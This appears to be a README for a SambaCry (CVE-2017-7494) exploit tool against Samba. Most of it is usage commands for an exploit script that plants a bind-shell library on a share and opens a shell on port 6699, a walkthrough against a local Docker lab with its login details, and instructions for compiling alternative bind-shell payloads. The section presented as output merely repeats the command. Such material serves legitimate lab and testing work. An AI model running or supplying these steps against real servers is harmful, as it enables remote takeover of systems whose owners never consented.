Samba is a free software re-implementation of the SMB/CIFS networking protocol. Samba provides file and print services for various Microsoft Windows clients and can integrate with a Microsoft Windows Server domain, either as a Domain Controller (DC) or as a domain member. As of version 4, it supports Active Directory and Microsoft Windows NT domains.

Samba in **4.5.9** version and before that is vulnerable to a remote code execution vulnerability named **SambaCry**.



### Exploit

```
./exploit.py -t <target> -e libbindshell-samba.so -s <share> -r <location>/libbindshell-samba.so -u <user> -p <password> -P 6699
```

For example, if you want to exploit the vulnerable environment with within this repository, run

```
./exploit.py -t localhost -e libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699
```

And you will get the following output

```
./exploit.py -t localhost -e libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699

```

### Vulnerable environment

```
docker run --rm -it -p 137-139:137-139 -p 445:445 -p 6699:6699 vulnerables/cve-2017-7494
```

If you want to access, use the following credentials

* User: `sambacry`
* Password: `nosambanocry`



### Alternative payloads

You can find one example of binding shell payload for this exploit in `bindshell-samba.c` file. Change it as you may find necessary. After that to generate a new binary, use:

```
gcc -c -fpic bindshell-samba.c
gcc -shared -o libbindshell-samba.so bindshell-samba.o
```

### Afftected software

Samba 4.5.9 and prior versions are vulnerable.
